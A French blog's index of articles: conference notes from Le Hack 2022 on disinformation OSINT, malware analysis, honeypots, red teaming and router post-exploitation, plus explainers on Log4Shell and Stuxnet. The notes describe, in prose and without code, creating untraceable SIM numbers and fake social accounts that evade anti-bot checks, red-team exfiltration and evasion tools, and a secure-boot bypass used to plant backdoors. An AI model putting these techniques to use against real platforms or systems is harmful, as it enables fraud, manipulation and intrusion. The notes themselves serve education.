qu\u0026rsquo;il ait environ 50-60 ans. On tombe sur une adresse postale qui correspond à l\u0026rsquo;une de celles trouvées précédemment, on a une quasi-certitude sur l\u0026rsquo;administrateur du site internet. Certaines informations permettent également de remonter jusqu\u0026rsquo;à sa compagne, qui semble être dans le même système de pensée, cela renforce les résultats.\nLes auteurs de la conférence ont essayé de contacter cette personne pour avoir une confirmation, sans succès. Néanmoins ils sont quasi-certains qu\u0026rsquo;il s\u0026rsquo;agit de cette personne.\nSi on revient au traqueur publicitaire découvert en début d\u0026rsquo;enquête, on peut estimer que les revenus publicitaires sont d\u0026rsquo;environ 30 à 40k€/an. Au delà de l\u0026rsquo;aspect politique, la désinformation est également une activité économique qui peut s\u0026rsquo;avérer très rémunératrice.\nConclusion # Qactus évolue dans une bulle clairement identifiable, son créateur et principal administrateur l\u0026rsquo;est aussi Propagation de l\u0026rsquo;information sur des réseaux \u0026ldquo;mainstream\u0026rdquo; comme \u0026ldquo;sous-terrain\u0026rdquo; ex : Gettr (réseau social américain conservateur) communauté forte et active participe à saturer l\u0026rsquo;espace publique (selon les mots du conférencier) un site comme celui-ci peut susciter un intérêt financier il est relativement simple d\u0026rsquo;analyser finement une aussi grande sphère d\u0026rsquo;information ","date":"30 juin 2022","permalink":"/posts/lehack2022/osint/desinformation-en-ligne/","section":"Mes articles","summary":"Open Facto fédérer l\u0026rsquo;OSINT français\nQactus : site de désinformation français proche de la mouvance Qanon (USA), les thématiques abordées sont les complots en tout genre, l\u0026rsquo;antivaccination, l\u0026rsquo;antisémitisme\u0026hellip; Il s\u0026rsquo;est fait connaître durant la crise du COVID.","title":"Cactées et succulentes, anatomie de la désinformation (Qactus)"},{"content":"Filipi Pires\nEn rédigeant ce retex, je suis tombé sur un article du conférencier qui explique une conférence identique qu\u0026rsquo;il a tenue : Malware Analysis Dissecting PDF File\nLe conférencier veut nous sensibiliser sur l\u0026rsquo;importance de connaître ses outils et leurs limitations. Cela, dans le but de rester en sécurité lors de l\u0026rsquo;étude d\u0026rsquo;un malware mais également pour ne pas passer à côté d\u0026rsquo;éléments importants. Le but de l\u0026rsquo;analyse est de déterminer si oui ou non ce fichier est malveillant.\nIl existe deux méthodes pour analyser un malware :\nanalyse statique -\u0026gt; on regarde le binaire sans l\u0026rsquo;exécuter, identification des fonctions importantes, utilisation de dll\u0026hellip; C\u0026rsquo;est de ce type d\u0026rsquo;analyse dont il est question ici. analyse dynamique -\u0026gt; utilisation d\u0026rsquo;une sandbox, analyse du comportement du malware, on l\u0026rsquo;exécute. Le workflow de l\u0026rsquo;analyse d\u0026rsquo;un malware est comme suit :\nidentification d\u0026rsquo;artefact -\u0026gt; rapport -\u0026gt; amélioration de la sécurité -\u0026gt; threat intel (optionnel, si l\u0026rsquo;organisme dispose des ressources) La conférence porte plutôt sur l\u0026rsquo;analyse d\u0026rsquo;artefact pour déterminer si un fichier est malveillant et le comprendre plus en détail le cas échéant. Pour illustrer ses propos, le présentateur nous invite à reconsidérer les types de fichiers. Sur un système UNIX, le magic number sert à déterminer le type d\u0026rsquo;un fichier, la manière dont il sera interprêté et avec quel outil il sera lu/exécuté. Un malware aura tendance à se cacher dans un fichier légitime. Pour illustrer cela, le conférencier analyse un fichier avec deux commandes tout en expliquant les limitations de l\u0026rsquo;outil :\nfile : se base sur le magic number pour déterminer le type d\u0026rsquo;un fichier, qui est manipulable facilement. strings : affiche les chaînes de caractères affichables, plus spécifiquement les chaînes de plus de 4 caractères. Le conférencier montre un exemple dans lequel strings ne trouve pas l\u0026rsquo;information utile. L\u0026rsquo;outil est important, mais le comprendre l\u0026rsquo;est encore plus.\nAnalyse d\u0026rsquo;un PDF # Le conférencier analyse un PDF avec les deux commandes précédentes et utilise ensuite des outils spécifiques pour les PDF :\npdftk pdfinfo pdfid (vraiment intéressant pour de l\u0026rsquo;analyse) pdf-parser Les résultats intéressants sont :\njavascript dans le PDF (équivalent macro pour les fichiers doc). (pdfinfo, pdfid) champ OpenAction (pdfid) action à l\u0026rsquo;ouverture champ stream (pdfid) qui contient souvent le payload malicieux liens entre les stream et les exécution d\u0026rsquo;action (pdf-parser --raw file.pdf) A ce moment là, on observe que le pdf contient du javascript obfusqué qui s\u0026rsquo;exécute à l\u0026rsquo;ouverture du fichier. On pourrait s\u0026rsquo;arrêter ici, car le but est atteint, on est quasiment certain que le fichier est malveillant à ce stade. Cependant, le conférencier continue pour nous montrer comment extraire le payload et déterminer ce qu\u0026rsquo;il fait.\nLorsqu\u0026rsquo;on extrait le stream contenant le javascript, on s\u0026rsquo;apperçoit qu\u0026rsquo;il est obfusqué. Le présentateur modifie le script pour afficher le javascript obfusqué et supprime l\u0026rsquo;eval pour ne pas que le code s\u0026rsquo;exécute. Il reste un niveau d\u0026rsquo;obfuscation qui est cassé avec Malzilla. On s\u0026rsquo;appercoit alors que le script permet de communiquer avec un C2 (Command and Control), on a la confirmation que l\u0026rsquo;IP est malveillante avec un localisateur d\u0026rsquo;IP.\n","date":"30 juin 2022","permalink":"/posts/lehack2022/conferences-techniques/malware-analysis/","section":"Mes articles","summary":"Filipi Pires\nEn rédigeant ce retex, je suis tombé sur un article du conférencier qui explique une conférence identique qu\u0026rsquo;il a tenue : Malware Analysis Dissecting PDF File","title":"Dissecting and comparing different binaries to malware analysis"},{"content":"CyberSec ICS\nHoneypot :\nservice volontairement exposé sur le net pour faire de l\u0026rsquo;analyse de le menace. 3 types : low, medium et high interaction. Pour faire simple, c\u0026rsquo;est le niveau de crédibilité du honeypot. Objectif : créer un honeypot crédible pour des systèmes industriels et analyser les données obtenues.\n1. Rechercher des équipements industriels exposés sur internet # Utilisation de Shodan. Beaucoup de machines exposées, plus ou moins critiques, les données récoltées serviront à créer des honeypots crédibles.\n2. Créer un honeypot crédible # Utilisation de python, il existe des librairies existantes. Cependant, certaines ont besoin d\u0026rsquo;être retravaillées, en plus de certaines interfaces réseau qu\u0026rsquo;il faut recoder. Il faut aussi que le honeypot dispose d\u0026rsquo;une intéraction, qu\u0026rsquo;il soit \u0026ldquo;high interaction\u0026rdquo;. Cette partie est primodiale pour que la collecte de données soit représentative de l\u0026rsquo;état de la menace.\n3. Hébergement # Au départ il était question d\u0026rsquo;héberger les honeypots dans le monde entier. Cependant, pour rester crédible il ne faut pas héberger ce type de système sur des hébergeurs type AWS ou Microsoft ; ils ne sont traditionnellement pas dans l\u0026rsquo;hébergement de systèmes industriels. Ce sont plutôt des petits hébergeurs locaux et dont les prix sont plus élevés. Quelques pays ont été privilégiés, dont l\u0026rsquo;Ukraine.\n4. Résultats # Shadowserver : scanneur très utile pour les systèmes industriels.\nBeaucoup de passages de scanners (beaucoup aux USA, un peu Pays-Bas et Islande [deux pays qui possèdent beaucoup de datacenters]). D\u0026rsquo;autres visite (hors scans) de la part des USA, Chine, Brésil, Chine et Russie. Tous les protocoles ne sont pas visés équitablement. Les attaquants reviennent généralement sur MOD-BUS, FOX et OPCUA. Les mot-de-passe utilisés en bruteforce dépendent fortement de la zone géographique dans laquelle est situé le honeypot. Conclusion # Il est possible de monitorer et de détecter des nouveaux comportements de la part des acteurs malveillants. Il n\u0026rsquo;est pas toujours facile de déployer des honeypots crédibles (par exemple le conférencier à dû modéliser mathématiquement une usine de traitement de l\u0026rsquo;eau et recréer une interface graphique). Pour aller plus loin, il faudrait installer des honeypots directement dans des entreprises. De plus, il faudrait travailler sur la couche TCP/IP (vulnérabilite amnesia33).\n","date":"30 juin 2022","permalink":"/posts/lehack2022/conferences-techniques/honeypot-industriel/","section":"Mes articles","summary":"CyberSec ICS\nHoneypot :\nservice volontairement exposé sur le net pour faire de l\u0026rsquo;analyse de le menace.","title":"Honeypot in ICS environment"},{"content":"Palenath Megadose\nLa conférence parle essentiellement de la création gratuite et facile de numéros de téléphone, utiles dans le cadre de la création de faux comptes de réseaux sociaux. Le conférencier veut pouvoir créer et manager facilement des numéros de téléphones qui ne pourraient pas lui être imputés.\nLe présentateur nous indique plusieurs solutions :\nil existe des cartes SIM gratuites à disposition dans certains magasins de téléphonie/bureaux de tabac. les différents services en lignes ne sont bien souvent pas gratuits, leurs numéros sont connus de la plupart des réseaux sociaux et il est difficile de passer à l\u0026rsquo;échelle. Arduino : intéressant d\u0026rsquo;un point de vue industrialisation mais bien trop cher, il faudrait un arduino par carte SIM. Dongle 4G -\u0026gt; cher Sim box -\u0026gt; intéressant, le coût n\u0026rsquo;est pas très élevé mais il y a de gros inconvénients. Les logiciels sont difficilement accessibles sous Linux, ils sont chers pas toujours très puissants. Il a donc développé lui-même son logiciel de gestion. Le conférencier nous indique qu\u0026rsquo;il utilise des commandes AT (commandes pour des modems), cela permet d\u0026rsquo;intéragir avec les SIM. Il supprime systématiquement les SMS des SIM pour rester anonyme. La gestion des cartes SIM est grandement facilitée.\nPour automatiser la création de compte sur les réseaux sociaux :\ncréer son proxy 4G utilisation de Selenium undetectable pour outrepasser les protections anti-bots utilisation de Buster (résolution de captcha) ","date":"30 juin 2022","permalink":"/posts/lehack2022/conferences-techniques/puppet-master/","section":"Mes articles","summary":"Palenath Megadose\nLa conférence parle essentiellement de la création gratuite et facile de numéros de téléphone, utiles dans le cadre de la création de faux comptes de réseaux sociaux.","title":"How to become the socket puppets master ?"},{"content":"Mirza Burhan Baig\nLogic flaw : traduit en \u0026ldquo;faille logique\u0026rdquo; dans ce retex, est une faille qui vient d\u0026rsquo;un manquement de l\u0026rsquo;application à vérifier son comportement lorsque l\u0026rsquo;utilisateur effectue des actions innatendues.\nLe top 10 des vulnérabilités web OWASP répertorie ce type de faille dans son classement. Pourtant, cela reste largement sous testé.\nCe type de faille vient d\u0026rsquo;une confiance excessive que l\u0026rsquo;application a envers l\u0026rsquo;utilisateur, ou la partie cliente d\u0026rsquo;une application. La faille résulte d\u0026rsquo;un échec du traitement d\u0026rsquo;une entrée non conventionnelle. Il faut partir du principe que l\u0026rsquo;utilisateur ne va pas toujours suivre le chemin prévu, surtout lorsqu\u0026rsquo;il s\u0026rsquo;agit d\u0026rsquo;une personne malveillante. De manière générale, la faille résulte d\u0026rsquo;une néglicence, d\u0026rsquo;un manquement dans le process.\nCe type de faille peut être aussi dévastatrice qu\u0026rsquo;une XSS ou une injection SQL. Il ne faut pas les sous-estimer ou les ramener à de simples bugs, mais plutôt les considérer comme des failles à part entière. Les failles logiques sont plutôt présentes dans des applications bancaires, du fait de leur complexité ainsi que des multiples étapes dans les processus d\u0026rsquo;authentification.\nPlusieurs pistes pour gérer ces failles :\nne pas faire confiance à l\u0026rsquo;utilisateur ou à la partie cliente d\u0026rsquo;une application. implémenter des jeux de tests complets dans l\u0026rsquo;application. audit en boîte blanche et analyse de la gestion des erreurs, des réponses de l\u0026rsquo;application ainsi que les points critiques (authentification par exemple). ","date":"30 juin 2022","permalink":"/posts/lehack2022/conferences-techniques/web-logic-flaw/","section":"Mes articles","summary":"Mirza Burhan Baig\nLogic flaw : traduit en \u0026ldquo;faille logique\u0026rdquo; dans ce retex, est une faille qui vient d\u0026rsquo;un manquement de l\u0026rsquo;application à vérifier son comportement lorsque l\u0026rsquo;utilisateur effectue des actions innatendues.","title":"Logic flaws, what are we missing in web application"},{"content":"Damien Cauquil\nLe conférencier veut nous inviter à aller plus loin que l\u0026rsquo;accès root. Il prend l\u0026rsquo;exemple d\u0026rsquo;un modèle de routeur où une faille 0-day a été découverte et qui ne sera pas patchée par le fabricant. Qu\u0026rsquo;est-ce qu\u0026rsquo;il est alors possible de faire ? Est-il possible d\u0026rsquo;avoir un accès total à la machine ? Pas seulement root, mais vraiment total ; pouvoir installer un autre firmware dessus, pose de backdoor, pivot\u0026hellip;\nLe système est un linux embarqué. Son boot process est le suivant : boot ROM -\u0026gt; Bootloader -\u0026gt; Kernel. Le Secure Boot est un méchanisme de protection qui permet de s\u0026rsquo;assurer que chaque composant du processus de boot est sain. Si un tel méchanisme est en place sur cet appareil, il faudra le neutraliser ; sinon l\u0026rsquo;appareil ne bootera pas.\nL\u0026rsquo;appareil comporte également une mémoire type NAND flash. C\u0026rsquo;est une mémoire peu fiable qui possède un méchanisme de nivellement d\u0026rsquo;usure et un mécanisme de code correcteur d\u0026rsquo;erreur (ECC).\nProblèmes post-exploit # Grâce à l\u0026rsquo;exploit de la 0-day nous sommes root, et ensuite ? On pourrait créer un botnet, prendre le contrôle de l\u0026rsquo;entiereté du système ou bien utiliser la machine pour du rebond.\nOn souhaite garder un accès à la machine et bloquer les éventuelles mises-à-jour.\nProblème : la mémoire du système est une ROM (read only memory), comment laisser une backdoor sur un système en lecture seule ? On pourrait alors dumper la mémoire, l\u0026rsquo;éditer puis la flasher de nouveau sur la ROM. Cependant, c\u0026rsquo;est une opération risquée en soit, et encore plus si la machine possède un Secure Boot. Pour vérifier ce dernier point, il faut fouiller dans le firmware de l\u0026rsquo;appareil. En faisant du reverse, on s\u0026rsquo;apperçoit qu\u0026rsquo;il y a des conditions étranges au tout début du démarrage de la machine, c\u0026rsquo;est un Secure Boot maison. Il possède une vulnérabilité : il ne vérifie pas l\u0026rsquo;intégralité du Bootloader, en plus du fait que les vérifications ne semblent être que deux conditions. Il suffit de les mettre à vrai pour outrepasser le Secure Boot.\nUne fois cette étape terminée, il n\u0026rsquo;y a plus aucune sécurité. On peut alors installer OpenWRT (distribution Linux pour du matériel embarqué).\nConclusion\nUn shell root ne veut pas dire qu\u0026rsquo;on a compromis tout le système. Le Secure Boot n\u0026rsquo;est pas infaillible, surtout lorsque c\u0026rsquo;est une solution maison. La programmation des mémoires types NAND flash est quelque chose de risqué. ","date":"30 juin 2022","permalink":"/posts/lehack2022/conferences-techniques/hacked-wifi-router/","section":"Mes articles","summary":"Damien Cauquil\nLe conférencier veut nous inviter à aller plus loin que l\u0026rsquo;accès root.","title":"So you hacked a wifi router and now what ?"},{"content":"Aman Sachdev\nObjectif : accéder au SDMS (scientist data managment system).\n1. Internet to intranet # L\u0026rsquo;équipe a commencé par essayer d\u0026rsquo;infiltrer la compagnie par le biais de ses applications webs. Ils ont trouvé une RCE, une injection SQL, une faille sur l\u0026rsquo;authentification SMTP, des défauts dans la configuration SAP ainsi que des mots de passe par défaut sur certaines installations. Ils ont également effectué de l\u0026rsquo;OSINT sur des employés via des fuites de bases de données, cela leur a permis de disposer de mots de passe. Cependant, les accès qu\u0026rsquo;ils ont pu avoir étaient limités par rapport à l\u0026rsquo;objectif final.\nIls ont donc décidé d\u0026rsquo;une approche physique. En rôdant dans une voiture à proximité du campus, ils sont parvenus à capter une borne wifi de l\u0026rsquo;entreprise et à s\u0026rsquo;infiltrer dans le réseau interne par ce biais.\n2. Eviter le SOC et exfiltrer de la donnée # Puisque c\u0026rsquo;est une grande entreprise, il y a une multitude de pare-feux, de bâtiments, de réseaux\u0026hellip; Pour bien cartographier, ils ont fait des scans, testé les VLAN, écouté le réseau et fait du phishing interne. Ils ont utilisé des exploits pour les pare-feux ce qui leur a donné accès à une base de données chiffrée.\nLes principales failles sont des logiciels installés par des tiers, qui ne sont plus maintenus/utilisés. Pour les exploiter, les auditeurs ont lu la documentation et identifié les mots de passe par défaut. Une faille importante était une base de données lancée avec les privilèges super-utilisateurs. Ces multiples failles leurs ont permis d\u0026rsquo;avoir accès aux notes des scientifiques ainsi qu\u0026rsquo;à un logiciel qu\u0026rsquo;ils utilisent pour avoir accès au SDMS. Ils ont posé une backdoor type Man-in-the-browser, lorsqu\u0026rsquo;une personne s\u0026rsquo;est connectée au SDMS, ils ont pu récupérer ses identifiants pour avoir un accès. Jackpot ! le SDMS contient les formules chimiques des molécules utilisées par le laboratoire et qui font l\u0026rsquo;objet de recherches très pointues et dont l\u0026rsquo;investissement est de plusieurs milliards de dollars. Les auditeurs étaient donc en mesure de modifier, supprimer, intervertir, exfiltrer les formules et les notes des scientifiques.\nL\u0026rsquo;objectif était atteint mais les auditeurs ont voulu poursuivre l\u0026rsquo;exploration.\n3. Accès à la ligne de production # Grâce à l\u0026rsquo;exploitation d\u0026rsquo;une configuration par défaut, les auditeurs ont été en mesure d\u0026rsquo;accéder à une machine vulnérable à une 0-day. C\u0026rsquo;était gagné : ils étaient en mesure de contrôler des machines de la ligne de production, création de boîtes, empaquetage\u0026hellip;\nL\u0026rsquo;objectif d\u0026rsquo;accéder au SDMS était atteint, avec en plus un bonus : les accès à la ligne de production.\nLes faiblesses identifiées \u0026amp; résumé # trop de scans possibles : trop de données en libre accès (OSINT sur les employés par exemple), mots-de-passes inchangés après des fuites\u0026hellip; la reconnaissance a été trop facile. services mal configurés, ou configurés par défaut. exploit possible sur des applications exposées sur le web. création de binaires signés, obfuscation des payloads, utilisation de token impersonation et désactivation des pare-feux. utilisation de Cobalt Strike, de VPN, de Meterpreter et de ABPTTS. SSL impersonation, One Drive/DropBox -\u0026gt; difficile de bloquer les bons flux avec ces outils là sur le réseau. Cela a facilité la discrétion des auditeurs. exfiltration et stéganographie grâce à CloakifyFactory, bind shell over HTTPS, DNS tunneling, ICMP, Empire Dropbox\u0026hellip; ","date":"30 juin 2022","permalink":"/posts/lehack2022/conferences-techniques/red-team-aspirin-mdma/","section":"Mes articles","summary":"Aman Sachdev\nObjectif : accéder au SDMS (scientist data managment system).","title":"Swapping aspirin formulas with MDMA while red teaming a billion dollar pharmaceutical"},{"content":"Lieutenant Yann Derweduwen (C3N)\nLe ComCyberGend communique beaucoup avec d\u0026rsquo;autres organismes nationaux comme l\u0026rsquo;ANSSI les assureurs ou encore la Police Judiciaire. L\u0026rsquo;Europe n\u0026rsquo;est pas en reste non plus puisqu\u0026rsquo;une communication privilégiée avec Interpol est également en place.\nL\u0026rsquo;OSINT se situe dans ce processus de travail :\nAccueil du public -\u0026gt; OSINT -\u0026gt; ESP* basse intensité -\u0026gt; ESP (infiltration active, filature, planque \u0026hellip;)\n*ESP : enquête sous pseudonymat (infiltration). L\u0026rsquo;ESP de basse intensité ne comporte pas de contact direct avec d\u0026rsquo;éventuels malfaiteurs.\nL\u0026rsquo;OSINT au sens du gendarme ne comporte un travail que sur ce qui pourra être jugé ensuite. Il n\u0026rsquo;y a pas de collecte des opinions politiques, d\u0026rsquo;une tendance d\u0026rsquo;un individu, si cela ne permet pas de constituer une preuve. C\u0026rsquo;est la différence entre le renseignement -\u0026gt; anticiper et le judiciaire -\u0026gt; punir. A la différence du renseignement, le judiciaire ne fait que du légal et la façon d\u0026rsquo;obtenir des informations est importante. En France la preuve est libre, on travail à charge et à décharge, cela n\u0026rsquo;est pas le cas dans tous les pays.\nD\u0026rsquo;une manière générale, on applique les mêmes techniques dans le cyberespace que dans le \u0026ldquo;monde réel\u0026rdquo;. Le cyber est un espace comme les autres, au même type qu\u0026rsquo;un milieux montagnard : il a des règles et des limitations intrinsèques.\nLa première chose à faire est d\u0026rsquo;étudier l\u0026rsquo;environnement immédiat, on va ensuite en élargissant :\ngel des lieux -\u0026gt; on fige les preuves (scrapping) planque \u0026amp; filature -\u0026gt; surveillance des réseaux sociaux, d\u0026rsquo;éventuel site sur les darknets \u0026hellip; Il est compliqué d\u0026rsquo;utiliser une détection par les signaux faibles. Cela demande de très gros moyens et ça n\u0026rsquo;est pas toujours légal. L\u0026rsquo;exploitation de fuite de base de données est considéré comme du recel.\nGEOTROUVETOUT\nOverpass Turbo qui était utilisé avant par le C3N, possède plusieurs limitations :\nlangage de requête complexe documentation perfectible pas de sauvegarde C\u0026rsquo;est pourquoi le C3N a développé un outil qui se base sur Overpass Turbo, baptisé Geotrouvetout. Il suffit de décrire un lieux (présence d\u0026rsquo;un passage piéton, d\u0026rsquo;une pharmacie à moins de 50m, un feux tricolore \u0026hellip;) et l\u0026rsquo;outil sort des lieux probables.\nUn exemple d\u0026rsquo;utilisation de l\u0026rsquo;outil a été exposé : un vrai appel au SDIS31 avec un interlocuteur très confus. La personne est en état de choc, son ami vient de se brûler le visage et il ne semble pas en mesure de décrire l\u0026rsquo;endroit où il se trouve, il n\u0026rsquo;est pas précis. Le pompier lui demande de décrire le lieux autour de lui et grâce à ces éléments et quelques déductions, il est possible de trouver le lieux de l\u0026rsquo;appel et d\u0026rsquo;envoyer une équipe très rapidement grâce à l\u0026rsquo;outil.\n","date":"30 juin 2022","permalink":"/posts/lehack2022/osint/judiciariser-losint/","section":"Mes articles","summary":"Lieutenant Yann Derweduwen (C3N)\nLe ComCyberGend communique beaucoup avec d\u0026rsquo;autres organismes nationaux comme l\u0026rsquo;ANSSI les assureurs ou encore la Police Judiciaire.","title":"OSINT et les investigations judiciaires"},{"content":"Ces documents sont les prises de notes rédigées de certaines conférences de Le Hack 2022. Ces notes peuvent être incomplètes ou inexactes ; certaines conférences dépassant mes domaines de compétences. Chacune d\u0026rsquo;entre-elles durait 45 minutes et étaient parfois présentées en anglais. Les conférences sont regroupées en deux parties :\nOSINT (plus compréhensibles pour le commun des mortels) Conférences techniques (plus difficiles à appréhender) Les conférences auxquelles j\u0026rsquo;ai participé et dans lesquelles j\u0026rsquo;ai pris des notes pertinentes sont :\nOSINT :\nL\u0026rsquo;OSINT et les investigations judiciaires Lieutenant Yann Derweduwen (C3N) Cactées \u0026amp; succulentes, anatomie de la désinformation Open Facto L\u0026rsquo;OSINT dans la Red Team Epios Conférences Techniques :\nDissecting and comparing different binaries to malware analysis Filipi Pires Honey Pot in ICS environment CyberSec ICS How to become a puppet Master ? So you hacked a wifi router and now what ? Daniel Cauquil Swapping Aspirin Formulas with MDMA while red teaming a billion dollar pharmaceutical Aman Sachdev Logic flaws, what are we missing in web application ? Mirza Burhan Baig ","date":"30 juin 2022","permalink":"/posts/lehack2022/","section":"Mes articles","summary":"Ces documents sont les prises de notes rédigées de certaines conférences de Le Hack 2022.","title":"Le Hack 2022"},{"content":"Je vais vous expliquer simplement comment cette faille, découverte le 10 décembre 2021, est en mesure de mettre à feu et à sang l’écrasante majorité des systèmes informatiques. La légende voudrait qu’elle ait été découverte sur un serveur Minecraft dont l’unique but était de faire des farces. Cette faille a le bon goût de ne pas être trop technique, laissez vous guider, je vous explique tout …\nD\u0026rsquo;abord une librairie : log4j # Tout commence par la librairie log4j qui est écrite en Java (oui le même truc qui vous demande souvent une mise à jour). Une librairie c’est du code écrit par des développeurs pour automatiser des tâches et qui est ensuite réutilisée par d’autres développeurs dans des projets plus gros. C’est un peu comme une brique spécifique qui permet de construire plus rapidement des maisons. Une grande partie des applications, des sites, des logiciels utilisées sur le web (ou reliés au web) utilise log4j et donc Java. Cette librairie sert essentiellement à gérer les logs, c\u0026rsquo;est-à-dire la trace de ce qu\u0026rsquo;il se passe sur le serveur.\nEnsuite la faille : log4shell # Log4shell est le nom de la faille, et elle se base sur une vulnérabilité de log4j. Mais comment ça fonctionne ? En fait log4j pour fonctionner reçoit des données et les traite. Cependant, dans les données qu’on lui envoie on peut lui signifier des tâches automatiques à faire (par exemple, ajouter dynamiquement l\u0026rsquo;heure), et notamment lui demander d’aller chercher du contenu quelque part sur internet. Si on demande à log4j d’aller chercher du code Java… la librairie va exécuter ce code ! C’est ça la faille log4shell.\nCela signifie que si j’envoie la bonne donnée à un serveur, celui-ci demande à log4j de la traiter. Cependant cette donnée dit à la librairie d’aller chercher une ressource sur internet qui n’est autre que du code Java malveillant que j’ai moi-même codé. Une fois ce code récupéré, le serveur va l’exécuter. Je peux alors exécuter n’importe quel code Java sur un serveur ne m’appartenant pas. On peut utiliser ce code pour créer un « reverse shell » (d’où le nom log4shell) : un accès direct, non autorisé et avec tous les droits sur le serveur. On a donc un accès total et absolu sur la machine ciblée.\n(en vérité le niveau d\u0026rsquo;accès dépend de plusieurs facteurs, mais souvent on peut obtenir des accès assez importants voire carrément administrateurs)\nOn peut ensuite utiliser cet accès pour essayer d’accéder à d’autres machines, créer un autre accès plus discret, mettre hors service le serveur, voler des données…\nLog4j everywhere # Cette librairie est partout, et sa faille avec. Un exemple : le rover de la NASA actuellement sur Mars utilise log4j. Les pirates peuvent donc librement scanner internet à la recherche d’un serveur, d’une application, d’un site qui utilise cette librairie pour ensuite prendre le contrôle de la machine. C’est d’ailleurs ce qu’ils font depuis que la faille a été exposée au grand jour, comme on peut le voir sur ce site qui répertorie les tentatives d’exploitation de la vulnérabilité : log4j-tracker. Mais il y a pire, encore faut-il savoir qu\u0026rsquo;on utilise cette librairie ! Les logiciels sont de plus en plus complexes et embarquent avec eux des librairies\u0026hellip; qui embarquent elles-mêmes des librairies, et ainsi de suite ! On peut donc être vulnérable au second, troisième\u0026hellip; n-ième degré, sans le savoir.\nA l’heure de l’écriture de ces lignes (17 décembre 2021) c’est une course contre les pirates qui est menée par les responsables cybersécurité de toutes les entreprises/organismes qui utilisent cette librairie. Certains publient des correctifs alors que dans le même temps des pirates cherchent à les contourner.\nMes pensées vont à tous les responsables cyber qui passeront (à minima) des fêtes de fin d’année mouvementées…\n","date":"17 décembre 2021","permalink":"/posts/la-plus-grosse-faille-de-la-decennie-log4shell/","section":"Mes articles","summary":"Je vais vous expliquer simplement comment cette faille, découverte le 10 décembre 2021, est en mesure de mettre à feu et à sang l’écrasante majorité des systèmes informatiques.","title":"La Plus Grosse Faille De La Décennie Log4shell"},{"content":"Comment les centrales nucléaires iraniennes on-t-elles été infiltrées et sabotées par un programme informatique ?\nCet article est un issu d\u0026rsquo;un devoir d\u0026rsquo;analyse de la menace effectué durant ma première année d\u0026rsquo;école d\u0026rsquo;ingénieur.\nTout commence en Biélorussie\u0026hellip; # En juin 2010, la société biélorusse VirusBlockAda reçoit un appel d’un de ses clients irannien. Certains ordinateurs ont un comportement étrange, ils redémarrent sans raison et indiquent des BSOD (erreur système fatale). Ce qui semblait être une infection mineure, s’avère être bien plus mystérieux quand l’équipe biélorusse découvre qu’un programme malveillant est à l’œuvre et que celui-ci est signé par des sociétés comme Verisign ou encore Realtek Semiconductor Corps, des compagnies reconnues, sérieuses et fiables.\nQuelques mots sur la signature # La signature est un procédé cryptographique qui permet d\u0026rsquo;approuver la provenance et l\u0026rsquo;intégrité (non-modification) de l\u0026rsquo;élément signé, ici un programme. Cela permet d\u0026rsquo;être certain que le programme provient bien d\u0026rsquo;une organisation de confiance. C\u0026rsquo;est cette organisation qui signe le logiciel grâce à un certificat, et chacun peut ensuite vérifier que la signature est bien celle de l\u0026rsquo;organisme émetteur.\nLes certificats sont créés par l\u0026rsquo;organisme et sont extrêmement bien protégés. En effet, si un pirate pouvait obtenir un certificat d\u0026rsquo;une société comme Google, il pourrait créé un programme se revendiquant de cette entreprise. Les machines approuvant les programmes de chez Google laisseraient donc aussi ce programme passer.\nLa première cyber-arme de l\u0026rsquo;Histoire # Après des recherches plus poussées, il s’avère que ce programme utilise quatre « zero days » (failles pour lesquelles il n\u0026rsquo;existe pas de correctif, souvent inconnues avant leur exploitation) et qu’il passe outre la plupart des antivirus. VirusBlockAda venait de découvrir Stuxnet, la première « cyber arme » connue de l’histoire qui visait des systèmes industriels très précis, à savoir des centrifugeuses iraniennes d’enrichissement d’uranium. Ces sites hautement sensibles et protégées se sont soudainement rendues compte que leurs machines étaient infectées depuis au moins un an par un « APT » (advanced persistant threat = menace avancée persistante). Pire que cela, après des mois d’investigation, les iraniens ont reconnu que Stuxnet avait réussi à « causer des problèmes à un nombre limité de nos centrifugeuses » mais aussi que le virus aurait été introduit via des clefs usb infectées. Enfin, selon Microsoft, une équipe sur place aurait été nécessaire afin d’avoir une connaissance de l’environnement suffisante pour développer le programme. Plusieurs questions se posent :\ncomment une attaque d’une telle complexité, d’une telle envergure, a-t-elle pu être menée à bien ? comment est-ce possible qu’un virus puisse impacter ce type d’installation ? pourquoi est-il passé sous les radars ? Contexte # Cette attaque inédite s’inscrit dans un environnement géopolitique complexe entre l’Iran, ses voisins (notamment Israël), et les puissances occidentales. Depuis des décennies, l’Iran mène un programme nucléaire civil. Cependant, plusieurs puissances étrangères pensent que ce programme de recherche cache un côté militaire visant à l’acquisition de l’arme nucléaire. Cela menace l’équilibre géopolitique précaire de la région, en particulier avec Israël. Ce programme, quel que soit son objectif, nécessite des centrifugeuses et c’est l’entreprise Siemens qui les fournit. C’est un des points clefs du projet et c’est à ces dispositifs que Stuxnet s’attaque. Aujourd’hui, il semblerait que cette attaque ait été orchestrée par les États-Unis dans le cadre de l’opération « Olympic Games » (voir l\u0026rsquo;affaire Snowden), avec l’aide d’Israël. Ce dernier ne se cachant plus que la cyberguerre fait désormais partie intégrante de sa doctrine militaire.\nA noter que ni les Etats-Unis, ni Israël n\u0026rsquo;ont revendiqués l\u0026rsquo;attaque. Il y a toujours des doutes quant aux commanditaires de cette opération. Plusieurs éléments semblent indiquer qu\u0026rsquo;il pourrait s\u0026rsquo;agir de ces deux pays. De manière générale, un état ne revendique jamais ses actions offensives dans le cyber-espace (guerre en Ukraine à part).\nExploitation # Ce virus se propage de trois manières différentes, via des clefs USB, des fichiers projets Siemens vérolés, ou par réplication dans le réseau. De plus, il est capable d’établir un réseau peer-to-peer pour se mettre à jour même sans connexion internet. En se répliquant, le virus est capable de communiquer avec ses copies, si l\u0026rsquo;une de ces copies possède un accès à internet, elle va se mettre à jour et transmettre les mises à jour aux autres copies sur le réseau (bien souvent non connnectées à internet).\nStuxnet dispose de deux atouts pour rester discret : il est signé par des entreprises officielles et il peut modifier son comportement en fonction des antivirus installés sur les machines. A noter que ce programme vise des installations très spécifiques. S’il ne se trouve pas sur l’une d’elles, il se réplique sur les machines à sa portée et se supprime. Il est important de comprendre la subtilité avec laquelle Stuxnet vise ses cibles. Ce programme a été retrouvé a posteriori dans plusieurs systèmes industriels de par le monde, notamment dans une centrale nucléaire russe. Cela grâce à l’efficacité de la propagation du vers (type de virus). Cependant, les cibles semblent être les centrales nucléaires iraniennes, aux vues des versions et configurations extrêmement précises requises pour que Stuxnet opère. Cela renforce également les soupçons d’une aide interne pour obtenir ces informations ultra-sensibles.\nVient ensuite la phase d’installation et de persistance 